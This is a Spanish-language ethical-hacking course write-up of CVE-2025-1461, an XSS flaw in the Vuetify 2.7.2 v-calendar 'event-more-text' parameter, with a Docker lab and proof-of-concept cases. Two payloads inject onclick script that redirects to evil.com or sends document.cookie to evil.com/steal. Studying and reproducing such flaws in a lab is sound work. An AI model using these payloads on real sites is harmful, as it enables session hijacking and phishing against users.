# Vulnerabilidad CVE-2025-1461 en Vuetify v2.7.2
## Análisis y Prueba de Concepto (Proof of Concept)

### Información General
- **CVE ID**: CVE-2025-1461
- **Componente Afectado**: Vuetify v-calendar component
- **Versión Vulnerable**: Vuetify 2.7.2 y versiones anteriores
- **Tipo de Vulnerabilidad**: Cross-Site Scripting (XSS)
- **Severidad**: Alta
- **Vector de Ataque**: Parámetro `event-more-text` del componente v-calendar

### Descripción de la Vulnerabilidad
La vulnerabilidad se encuentra en el componente `v-calendar` de Vuetify, específicamente en el parámetro `event-more-text`. Este parámetro no valida ni escapa adecuadamente el contenido HTML/JavaScript que recibe, permitiendo la ejecución de código malicioso en el contexto del navegador del usuario.

---

## 1. Preparación del Entorno

### 1.1 Requisitos del Sistema
- **Sistema Operativo**: Windows 10/11, macOS, o Linux
- **Node.js**: Versión 16 o superior
- **Docker Desktop**: Para contenedorización
- **Git**: Para control de versiones
- **Editor de Código**: VS Code recomendado

### 1.2 Configuración del Proyecto Vulnerable

#### Paso 1: Clonar el Repositorio
```bash
git clone https://github.com/hroacastillo/grupo05_ethical_hacking.git
cd grupo05_ethical_hacking
```

#### Paso 2: Verificar Dependencias Vulnerables
El archivo `package.json` contiene las siguientes dependencias vulnerables:
```json
{
  "dependencies": {
    "@mdi/font": "^7.4.47",
    "vue": "2.6.14",
    "vuetify": "2.7.2"
  }
}
```

#### Paso 3: Configuración con Docker

**Archivo Dockerfile:**
```dockerfile
# Usar Node.js 16 como imagen base
FROM node:16-alpine

# Establecer el directorio de trabajo
WORKDIR /app

# Copiar package.json y package-lock.json
COPY package*.json ./

# Instalar dependencias
RUN npm install

# Copiar el resto del código fuente
COPY . .

# Exponer el puerto 3000
EXPOSE 3000

# Comando para ejecutar la aplicación
CMD ["npm", "run", "dev", "--", "--host", "0.0.0.0", "--port", "3000"]
```

**Archivo docker-compose.yml:**
```yaml
version: '3.8'

services:
  vuetify-app:
    build: .
    ports:
      - "3000:3000"
    volumes:
      - .:/app
      - /app/node_modules
    environment:
      - NODE_ENV=development
    stdin_open: true
    tty: true
```

#### Paso 4: Levantar el Entorno
```bash
# Construir y levantar el contenedor
docker-compose up --build

# Acceder a la aplicación
# URL: http://localhost:3000
```

### 1.3 Configuración de Vuetify
El archivo `src/vuetify.js` está configurado con:
```javascript
import Vue from 'vue'
import Vuetify from 'vuetify'
import 'vuetify/dist/vuetify.min.css'
import '@mdi/font/css/materialdesignicons.css'

Vue.use(Vuetify)

const opts = {
  icons: {
    iconfont: 'mdi',
  },
}

export default new Vuetify(opts)
```

---

## 2. Herramientas Utilizadas

### 2.1 Herramientas de Desarrollo
- **Vue.js 2.6.14**: Framework JavaScript para la interfaz de usuario
- **Vuetify 2.7.2**: Biblioteca de componentes Material Design (versión vulnerable)
- **Vite 2.0.0**: Herramienta de build y desarrollo
- **Docker**: Contenedorización para aislamiento del entorno

### 2.2 Herramientas de Análisis
- **VS Code**: Editor de código para análisis del código fuente
- **DevTools del Navegador**: Para inspección de elementos y debug
- **Docker Desktop**: Gestión de contenedores

### 2.3 Dependencias del Proyecto
```json
{
  "name": "vuetify2-nes-starter",
  "version": "0.0.0",
  "scripts": {
    "dev": "vite",
    "build": "vite build",
    "serve": "vite preview"
  },
  "dependencies": {
    "@mdi/font": "^7.4.47",
    "vue": "2.6.14",
    "vuetify": "2.7.2"
  },
  "devDependencies": {
    "vite": "^2.0.0",
    "vite-plugin-vue2": "latest",
    "vue-template-compiler": "~2.6.0"
  }
}
```

### 2.4 Configuración de Vite
Archivo `vite.config.js` optimizado para Docker:
```javascript
import { defineConfig } from 'vite'
import { createVuePlugin as vue } from 'vite-plugin-vue2'

const path = require('path')

export default defineConfig({
  plugins: [vue()],
  server: {
    host: '0.0.0.0',
    port: 3000,
    watch: {
      usePolling: true
    }
  },
  resolve: {
    alias: [
      {
        find: /^@\/(.+)/,
        replacement: path.resolve(__dirname, 'src') + '/$1'
      }
    ]
  }
})
```

---

## 3. Prueba de Concepto (Proof of Concept)

### 3.1 Caso 1: Redirección Maliciosa

#### Descripción
Este exploit demuestra cómo un atacante puede forzar la redirección de usuarios a sitios web maliciosos sin su consentimiento.

#### Código Vulnerable
```vue
<v-calendar
  :now="today"
  :value="today"
  :events="events"
  color="primary"
  type="month"
  event-more
  event-more-text="<span onclick=&quot;window.location='https://evil.com'&quot;>🚨 Click Here</span>"
/>
```

#### Payload Utilizado
```javascript
window.location='https://evil.com'
```

#### Pasos para Reproducir
1. **Acceder a la aplicación**: Navegar a `http://localhost:3000`
2. **Seleccionar la pestaña**: "Redirección maliciosa"
3. **Observar el calendario**: Se muestran múltiples eventos en la fecha 2019-01-07
4. **Hacer clic en "🚨 Click Here"**: El usuario es redirigido inmediatamente a `https://evil.com`

#### Impacto
- **Phishing**: Redirección a sitios que imitan páginas legítimas
- **Malware**: Redirección a sitios que distribuyen software malicioso
- **Robo de credenciales**: Dirigir usuarios a formularios de login falsos

### 3.2 Caso 2: Robo de Cookies

#### Descripción
Este exploit demuestra cómo un atacante puede extraer cookies de sesión y otros datos sensibles del navegador del usuario.

#### Código Vulnerable
```vue
<v-calendar
  :now="today"
  :value="today"
  :events="events"
  color="primary"
  type="month"
  event-more
  event-more-text="<span onclick=&quot;fetch('https://evil.com/steal?cookies=' + encodeURIComponent(document.cookie)).catch(()=>alert('Cookies robadas: ' + document.cookie))&quot;>🚨 Click Here</span>"
/>
```

#### Payload Utilizado
```javascript
fetch('https://evil.com/steal?cookies=' + encodeURIComponent(document.cookie))
.catch(()=>alert('Cookies robadas: ' + document.cookie))
```

#### Pasos para Reproducir
1. **Acceder a la aplicación**: Navegar a `http://localhost:3000`
2. **Establecer cookies de prueba**: Abrir DevTools y ejecutar:
   ```javascript
   document.cookie = "session_token=abc123; path=/";
   document.cookie = "user_id=12345; path=/";
   ```
3. **Seleccionar la pestaña**: "Robo de Cookies"
4. **Hacer clic en "🚨 Click Here"**: Se ejecuta el payload malicioso
5. **Observar el resultado**: Aparece un alert mostrando las cookies extraídas

#### Impacto
- **Secuestro de sesión**: Robo de tokens de autenticación
- **Robo de datos personales**: Extracción de información sensible almacenada en cookies
- **Suplantación de identidad**: Uso de cookies robadas para acceder a cuentas de usuario

### 3.3 Caso 3: Comportamiento Normal (Control)

#### Descripción
Este caso muestra el comportamiento esperado del componente cuando no se introduce código malicioso.

#### Código Seguro
```vue
<v-calendar
  data-testid="calendar-default"
  :now="today"
  :value="today"
  :events="events"
  color="primary"
  type="month"
  event-more
/>
```

#### Pasos para Reproducir
1. **Acceder a la aplicación**: Navegar a `http://localhost:3000`
2. **Seleccionar la pestaña**: "Comportamiento normal"
3. **Observar el calendario**: Se muestra el texto por defecto "X more" sin funcionalidad maliciosa
4. **Hacer clic en el enlace**: Solo se muestra más información sobre los eventos

#### Resultado Esperado
- **Funcionalidad normal**: El componente funciona según su diseño original
- **Sin ejecución de código**: No se ejecuta JavaScript malicioso
- **Seguridad**: El comportamiento es predecible y seguro

---

**Fecha de Análisis**: 21 de Julio, 2025  
**Responsable**: Grupo 05
**Institución**: UPC - Universidad Peruana de Ciencias Aplicadas  
**Curso**: Ethical Hacking

---

Prueba de concepto adaptado de: https://github.com/neverendingsupport/nes-vuetify-cve-2025-1461.git